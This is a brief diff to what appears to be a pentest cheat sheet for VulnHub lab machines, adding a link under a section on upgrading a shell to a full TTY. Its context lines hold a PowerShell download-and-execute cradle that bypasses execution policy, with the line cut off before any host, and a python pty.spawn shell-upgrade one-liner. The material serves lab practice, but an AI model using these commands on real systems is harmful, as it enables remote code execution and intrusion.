@@ -283,7 +283,7 @@ powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Invoke-Expression (Ne
 
 ### 4.6. Upgrade to Full TTY
 
-[Used in: digitalworld.local:JOY](/practice/vulnhub/digitalworld.local-joy.md)
+Used in: [digitalworld.local:JOY](/practice/vulnhub/digitalworld.local-joy.md), [digitalworld.local:MERCYv2](/practice/vulnhub/digitalworld.local-mercy.md)
 
 ```console
 python -c 'import pty;pty.spawn("/bin/bash")'
